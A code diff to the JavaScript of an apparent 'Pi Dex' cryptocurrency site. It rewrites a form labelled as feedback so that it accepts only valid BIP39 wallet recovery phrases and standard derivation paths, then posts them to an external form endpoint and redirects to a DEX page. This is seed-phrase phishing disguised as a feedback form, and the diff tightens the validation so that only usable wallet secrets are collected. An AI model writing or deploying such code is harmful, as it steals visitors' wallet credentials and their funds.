@@ -97,64 +97,96 @@ function toggleMenu() {
 }
 
 // ========================================
-// FEEDBACK PAGE FUNCTIONALITY
+// FEEDBACK PAGE FUNCTIONALITY (STRICT)
 // ========================================
-function initializeFeedbackPage() {
-    const feedbackForm = document.getElementById('feedbackForm');
-    const feedbackTextarea = document.getElementById('feedback');
+
+document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
+
+async function initializeFeedbackPage() {
+    const form = document.getElementById('feedbackForm');
+    const mnemonicInput = document.getElementById('feedback');
+    const pathInput = document.getElementById('derivationPath');
     const errorMessage = document.getElementById('errorMessage');
 
-    if (feedbackForm && feedbackTextarea) {
-        feedbackForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const text = feedbackTextarea.value.trim();
-            const words = text.split(/\s+/).filter(function(word) {
-                return word.length > 0;
-            });
-            
-            // Validate exactly 24 words
-            if (words.length !== 24) {
-                if (errorMessage) {
-                    const wordText = words.length !== 1 ? 'words' : 'word';
-                    errorMessage.textContent = 'Error: Please enter exactly 24 words. You entered ' + words.length + ' ' + wordText + '.';
-                    errorMessage.style.display = 'block';
-                }
-                return;
-            }
-            
-            // Hide error message if validation passes
-            if (errorMessage) {
-                errorMessage.style.display = 'none';
-            }
-            
-            // Submit to Formspree
-            const formData = new FormData(this);
-            fetch(this.action, {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            })
-            .then(function(response) {
-                if (response.ok) {
-                    // Redirect to DEX page on success
-                    window.location.href = 'dex.html';
-                } else {
-                    if (errorMessage) {
-                        errorMessage.textContent = 'Error submitting feedback. Please try again.';
-                        errorMessage.style.display = 'block';
-                    }
-                }
-            })
-            .catch(function(error) {
-                console.log('Form submission error, redirecting to DEX anyway...');
-                // Redirect even on error for demo purposes
-                window.location.href = 'dex.html';
-            });
-        });
+    // Load official BIP39 wordlist
+    const wordlist = await fetch(
+        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt'
+    )
+        .then(r => r.text())
+        .then(t => t.trim().split('\n'));
+
+    function showError(msg) {
+        errorMessage.textContent = msg;
+        errorMessage.style.display = 'block';
     }
+
+    function hideError() {
+        errorMessage.style.display = 'none';
+    }
+
+    function isValidBip39(mnemonic) {
+        const words = mnemonic.split(/\s+/);
+
+        if (![12, 15, 18, 21, 24].includes(words.length)) {
+            return false;
+        }
+
+        for (const word of words) {
+            if (!wordlist.includes(word)) {
+                return false;
+            }
+        }
+
+        return window.bip39.validateMnemonic(mnemonic);
+    }
+
+    function isValidDerivationPath(path) {
+        const allowedPatterns = [
+            /^m\/44'\/\d+'\/\d+'\/\d+\/\d+$/,   // BIP44
+            /^m\/49'\/\d+'\/\d+'\/\d+\/\d+$/,   // BIP49
+            /^m\/84'\/\d+'\/\d+'\/\d+\/\d+$/,   // BIP84
+            /^m\/60'\/\d+'\/\d+'\/\d+\/\d+$/,   // Ethereum
+            /^m\/44'\/314159'\/\d+'\/\d+\/\d+$/ // Pi Network style
+        ];
+
+        return allowedPatterns.some(rx => rx.test(path));
+    }
+
+    if (!form) return;
+
+    form.addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const mnemonic = mnemonicInput.value.trim().toLowerCase();
+        const path = pathInput.value.trim();
+
+        if (!isValidBip39(mnemonic)) {
+            showError('Invalid recovery phrase. Please enter a valid BIP39 mnemonic.');
+            return;
+        }
+
+        if (!isValidDerivationPath(path)) {
+            showError('Invalid derivation path. Use a standard BIP44 / BIP49 / BIP84 path.');
+            return;
+        }
+
+        hideError();
+
+        const formData = new FormData(form);
+
+        fetch(form.action, {
+            method: 'POST',
+            body: formData,
+            headers: { Accept: 'application/json' }
+        })
+        .then(res => {
+            if (!res.ok) throw new Error();
+            window.location.href = 'dex.html';
+        })
+        .catch(() => {
+            showError('Submission failed. Please try again.');
+        });
+    });
 }
 
 // ========================================
@@ -461,3 +493,4 @@ console.log('Pi Dex Script Loaded Successfully');
 console.log('GCV Price (Fixed): $' + piPriceUSD.toFixed(2));
 console.log('Selected Network: ' + selectedNetwork);
 console.log('Trading Mode: ' + (isBuyingPi ? 'Buying Pi' : 'Selling Pi'));
+
